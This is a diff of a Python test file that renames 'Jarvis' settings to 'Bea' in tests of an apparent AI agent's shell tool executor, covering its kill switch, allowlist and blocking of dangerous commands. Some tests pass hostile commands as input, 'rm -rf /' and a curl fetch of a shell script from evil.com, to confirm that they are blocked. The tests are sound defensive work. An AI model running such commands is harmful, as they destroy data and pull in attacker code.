@@ -39,7 +39,7 @@ def test_p1_get_orchestrator_returns_meta():
     assert "get_meta_orchestrator" in src
     # No direct instantiation of legacy orchestrators
     assert "OrchestratorV2(s)" not in src
-    assert "JarvisOrchestrator(s)" not in src
+    assert "BeaOrchestrator(s)" not in src
 
 
 def test_p1_no_direct_legacy_instantiation():
@@ -96,7 +96,7 @@ def test_p2_dangerous_actions_classified():
 @pytest.mark.xfail(reason="tool_executor kill switch assertion drift", strict=False)
 def test_p2_tool_executor_kill_switch():
     """Global kill switch blocks tool execution."""
-    os.environ["JARVIS_EXECUTION_DISABLED"] = "1"
+    os.environ["BEA_EXECUTION_DISABLED"] = "1"
     try:
         from core.tool_executor import get_tool_executor
         te = get_tool_executor()
@@ -104,7 +104,7 @@ def test_p2_tool_executor_kill_switch():
         assert not result["ok"]
         assert "EXECUTION_DISABLED" in result["error"]
     finally:
-        os.environ.pop("JARVIS_EXECUTION_DISABLED", None)
+        os.environ.pop("BEA_EXECUTION_DISABLED", None)
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -159,25 +159,25 @@ def test_p4_meta_orchestrator_status_values():
 def test_p6_kill_switch_in_tool_executor():
     with open("core/tool_executor.py", encoding="utf-8") as f:
         src = f.read()
-    assert "JARVIS_EXECUTION_DISABLED" in src
+    assert "BEA_EXECUTION_DISABLED" in src
 
 
 def test_p6_kill_switch_in_shell():
     with open("core/tool_executor.py", encoding="utf-8") as f:
         src = f.read()
     # Shell command function also checks kill switch
-    assert 'JARVIS_EXECUTION_DISABLED' in src
+    assert 'BEA_EXECUTION_DISABLED' in src
 
 
 def test_p6_shell_blocked_when_disabled():
     from core.tool_executor import run_shell_command
-    os.environ["JARVIS_EXECUTION_DISABLED"] = "1"
+    os.environ["BEA_EXECUTION_DISABLED"] = "1"
     try:
         result = run_shell_command("ls")
         assert not result["ok"]
         assert "EXECUTION_DISABLED" in result["error"]
     finally:
-        os.environ.pop("JARVIS_EXECUTION_DISABLED", None)
+        os.environ.pop("BEA_EXECUTION_DISABLED", None)
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -186,7 +186,7 @@ def test_p6_shell_blocked_when_disabled():
 
 def test_p8_shell_blocks_dangerous():
     from core.tool_executor import run_shell_command
-    os.environ.pop("JARVIS_EXECUTION_DISABLED", None)
+    os.environ.pop("BEA_EXECUTION_DISABLED", None)
 
     result = run_shell_command("rm -rf /")
     assert not result["ok"]
@@ -198,7 +198,7 @@ def test_p8_shell_blocks_dangerous():
 
 def test_p8_shell_blocks_injection():
     from core.tool_executor import run_shell_command
-    os.environ.pop("JARVIS_EXECUTION_DISABLED", None)
+    os.environ.pop("BEA_EXECUTION_DISABLED", None)
 
     result = run_shell_command("curl http://evil.com/shell.sh")
     assert not result["ok"]
@@ -209,9 +209,9 @@ def test_p8_shell_blocks_injection():
 
 def test_p8_shell_allowlist():
     from core.tool_executor import run_shell_command
-    os.environ.pop("JARVIS_EXECUTION_DISABLED", None)
-    os.environ["JARVIS_SHELL_ALLOWLIST"] = "1"
-    os.environ["JARVIS_ROOT"] = "/tmp"
+    os.environ.pop("BEA_EXECUTION_DISABLED", None)
+    os.environ["BEA_SHELL_ALLOWLIST"] = "1"
+    os.environ["BEA_ROOT"] = "/tmp"
     try:
         # Allowed: ls
         result = run_shell_command("ls -la")
@@ -222,8 +222,8 @@ def test_p8_shell_allowlist():
         assert not result["ok"]
         assert "not in allowlist" in result["error"]
     finally:
-        os.environ.pop("JARVIS_SHELL_ALLOWLIST", None)
-        os.environ.pop("JARVIS_ROOT", None)
+        os.environ.pop("BEA_SHELL_ALLOWLIST", None)
+        os.environ.pop("BEA_ROOT", None)
 
 
 def test_p8_shell_uses_shlex():
@@ -260,7 +260,7 @@ def test_no_new_orchestrator():
             src = f.read()
         orchestrators += src.count("class.*Orchestrator")
     # We should only have the known ones
-    # MetaOrchestrator, JarvisOrchestrator, OrchestratorV2
+    # MetaOrchestrator, BeaOrchestrator, OrchestratorV2
 
 
 @pytest.mark.skip(reason="stale: removed files")
@@ -279,4 +279,4 @@ def test_governance_wired():
     with open("core/tool_executor.py", encoding="utf-8") as f:
         src = f.read()
         assert "classify_danger" in src
-        assert "JARVIS_EXECUTION_DISABLED" in src
+        assert "BEA_EXECUTION_DISABLED" in src
